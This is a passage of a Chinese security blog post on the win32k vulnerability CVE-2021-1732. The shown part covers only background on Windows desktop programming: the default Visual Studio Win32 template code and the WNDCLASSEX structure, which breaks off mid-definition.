<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CVE-2021-1732 ：win32k 中的相对偏移读写漏洞 | ret2ver</title><meta name="author" content="Vergissmeinnicht"><meta name="copyright" content="Vergissmeinnicht"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前置知识Windows 桌面编程我们可以直接用 Visual Studio 生成以下的默认模板： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-1732 ：win32k 中的相对偏移读写漏洞">
<meta property="og:url" content="https://ret2ver.github.io/2022/01/11/CVE-2021-1732-%EF%BC%9Awin32k-%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="ret2ver">
<meta property="og:description" content="前置知识Windows 桌面编程我们可以直接用 Visual Studio 生成以下的默认模板： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2022-01-11T07:43:21.000Z">
<meta property="article:modified_time" content="2022-05-04T14:00:45.568Z">
<meta property="article:author" content="Vergissmeinnicht">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ret2ver.github.io/2022/01/11/CVE-2021-1732-%EF%BC%9Awin32k-%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E5%81%8F%E7%A7%BB%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-1732 ：win32k 中的相对偏移读写漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-04 22:00:45'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ret2ver</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-1732 ：win32k 中的相对偏移读写漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-01-11T07:43:21.000Z" title="Created 2022-01-11 15:43:21">2022-01-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-05-04T14:00:45.568Z" title="Updated 2022-05-04 22:00:45">2022-05-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/">Windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/Kernel/">Kernel</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/Kernel/win32k/">win32k</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/Kernel/win32k/CVE/">CVE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2021-1732 ：win32k 中的相对偏移读写漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Windows-桌面编程"><a href="#Windows-桌面编程" class="headerlink" title="Windows 桌面编程"></a>Windows 桌面编程</h2><p>我们可以直接用 <code>Visual Studio</code> 生成以下的默认模板：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.cpp : 定义应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LOADSTRING 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量:</span></span><br><span class="line">HINSTANCE hInst;                                <span class="comment">// 当前实例</span></span><br><span class="line">WCHAR szTitle[MAX_LOADSTRING];                  <span class="comment">// 标题栏文本</span></span><br><span class="line">WCHAR szWindowClass[MAX_LOADSTRING];            <span class="comment">// 主窗口类名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 此代码模块中包含的函数的前向声明:</span></span><br><span class="line"><span class="function">ATOM                <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span>;</span><br><span class="line"><span class="function">BOOL                <span class="title">InitInstance</span><span class="params">(HINSTANCE, <span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK    <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"><span class="function">INT_PTR CALLBACK    <span class="title">About</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ LPWSTR    lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     _In_ <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此处放置代码。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化全局字符串</span></span><br><span class="line">    <span class="built_in">LoadStringW</span>(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);</span><br><span class="line">    <span class="built_in">LoadStringW</span>(hInstance, IDC_TEST, szWindowClass, MAX_LOADSTRING);</span><br><span class="line">    <span class="built_in">MyRegisterClass</span>(hInstance);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行应用程序初始化:</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">InitInstance</span> (hInstance, nCmdShow))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HACCEL hAccelTable = <span class="built_in">LoadAccelerators</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDC_TEST));</span><br><span class="line"></span><br><span class="line">    MSG msg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主消息循环:</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">TranslateAccelerator</span>(msg.hwnd, hAccelTable, &amp;msg))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">            <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>) msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  函数: MyRegisterClass()</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  目标: 注册窗口类。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">ATOM <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WNDCLASSEXW wcex;</span><br><span class="line"></span><br><span class="line">    wcex.cbSize = <span class="built_in">sizeof</span>(WNDCLASSEX);</span><br><span class="line"></span><br><span class="line">    wcex.style          = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc    = WndProc;</span><br><span class="line">    wcex.cbClsExtra     = <span class="number">0</span>;</span><br><span class="line">    wcex.cbWndExtra     = <span class="number">0</span>;</span><br><span class="line">    wcex.hInstance      = hInstance;</span><br><span class="line">    wcex.hIcon          = <span class="built_in">LoadIcon</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDI_TEST));</span><br><span class="line">    wcex.hCursor        = <span class="built_in">LoadCursor</span>(<span class="literal">nullptr</span>, IDC_ARROW);</span><br><span class="line">    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+<span class="number">1</span>);</span><br><span class="line">    wcex.lpszMenuName   = <span class="built_in">MAKEINTRESOURCEW</span>(IDC_TEST);</span><br><span class="line">    wcex.lpszClassName  = szWindowClass;</span><br><span class="line">    wcex.hIconSm        = <span class="built_in">LoadIcon</span>(wcex.hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDI_SMALL));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RegisterClassExW</span>(&amp;wcex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   函数: InitInstance(HINSTANCE, int)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   目标: 保存实例句柄并创建主窗口</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   注释:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        在此函数中，我们在全局变量中保存实例句柄并</span></span><br><span class="line"><span class="comment">//        创建和显示主程序窗口。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">BOOL <span class="title">InitInstance</span><span class="params">(HINSTANCE hInstance, <span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   hInst = hInstance; <span class="comment">// 将实例句柄存储在全局变量中</span></span><br><span class="line"></span><br><span class="line">   HWND hWnd = <span class="built_in">CreateWindowW</span>(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,</span><br><span class="line">      CW_USEDEFAULT, <span class="number">0</span>, CW_USEDEFAULT, <span class="number">0</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInstance, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!hWnd)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">ShowWindow</span>(hWnd, nCmdShow);</span><br><span class="line">   <span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  目标: 处理主窗口的消息。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  WM_COMMAND  - 处理应用程序菜单</span></span><br><span class="line"><span class="comment">//  WM_PAINT    - 绘制主窗口</span></span><br><span class="line"><span class="comment">//  WM_DESTROY  - 发送退出消息并返回</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> wmId = <span class="built_in">LOWORD</span>(wParam);</span><br><span class="line">            <span class="comment">// 分析菜单选择:</span></span><br><span class="line">            <span class="keyword">switch</span> (wmId)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> IDM_ABOUT:</span><br><span class="line">                <span class="built_in">DialogBox</span>(hInst, <span class="built_in">MAKEINTRESOURCE</span>(IDD_ABOUTBOX), hWnd, About);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IDM_EXIT:</span><br><span class="line">                <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">        &#123;</span><br><span class="line">            PAINTSTRUCT ps;</span><br><span class="line">            HDC hdc = <span class="built_in">BeginPaint</span>(hWnd, &amp;ps);</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 在此处添加使用 hdc 的任何绘图代码...</span></span><br><span class="line">            <span class="built_in">EndPaint</span>(hWnd, &amp;ps);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// “关于”框的消息处理程序。</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">About</span><span class="params">(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lParam);</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_INITDIALOG:</span><br><span class="line">        <span class="keyword">return</span> (INT_PTR)TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">LOWORD</span>(wParam) == IDOK || <span class="built_in">LOWORD</span>(wParam) == IDCANCEL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">EndDialog</span>(hDlg, <span class="built_in">LOWORD</span>(wParam));</span><br><span class="line">            <span class="keyword">return</span> (INT_PTR)TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (INT_PTR)FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行起来便可以得到一个简单的桌面程序：</p>
<p><img src="https://s2.loli.net/2022/05/04/7uXT8PSCAFLNHcZ.png" alt="Untitled.png"></p>
<p>程序的入口变为了 <code>wWinMain</code> ，代表为 <code>unicode</code> 版的 <code>WinMain</code> ，每个窗口类都通过 <code>RegisterClassExW</code> 进行注册，在上面的代码中体现为 <code>MyRegisterClass</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  函数: MyRegisterClass()</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  目标: 注册窗口类。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">ATOM <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WNDCLASSEXW wcex;</span><br><span class="line"></span><br><span class="line">    wcex.cbSize = <span class="built_in">sizeof</span>(WNDCLASSEX);</span><br><span class="line"></span><br><span class="line">    wcex.style          = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc    = WndProc;</span><br><span class="line">    wcex.cbClsExtra     = <span class="number">0</span>;</span><br><span class="line">    wcex.cbWndExtra     = <span class="number">0</span>;</span><br><span class="line">    wcex.hInstance      = hInstance;</span><br><span class="line">    wcex.hIcon          = <span class="built_in">LoadIcon</span>(hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDI_TEST));</span><br><span class="line">    wcex.hCursor        = <span class="built_in">LoadCursor</span>(<span class="literal">nullptr</span>, IDC_ARROW);</span><br><span class="line">    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+<span class="number">1</span>);</span><br><span class="line">    wcex.lpszMenuName   = <span class="built_in">MAKEINTRESOURCEW</span>(IDC_TEST);</span><br><span class="line">    wcex.lpszClassName  = szWindowClass;</span><br><span class="line">    wcex.hIconSm        = <span class="built_in">LoadIcon</span>(wcex.hInstance, <span class="built_in">MAKEINTRESOURCE</span>(IDI_SMALL));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">RegisterClassExW</span>(&amp;wcex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入的结构体为 <code>[WNDCLASSEX](https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-wndclassexa)</code> ，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagWNDCLASSEXA</span> &#123;</span><br><span class="line">  UINT      cbSize; <span class="comment">// 结构体大小</span></span><br><span class="line">  UINT      style; <span class="comment">// 窗口类风格</span></span><br><span class="line">  WNDPROC   lpfnWndProc; <span class="comment">// 窗口类消息处理函数的指针</span></span><br><span class="line">  <span class="type">int</span>       cbClsExtra; <span class="comment">// 窗口类额外字节，初始化为0</span></span><br><span class="line">  <span class="type">int</span>       cbWndExtra; <span class="comment">// 窗口类实例额外字节，初始化为0</span></span><br><span class="line">  HINSTANCE hInstance; <span class="comment">// 包含该窗口类消息处理函数的实例的句柄</span></span><br><span class="line">  HICON     hIcon; <span class="comment">// 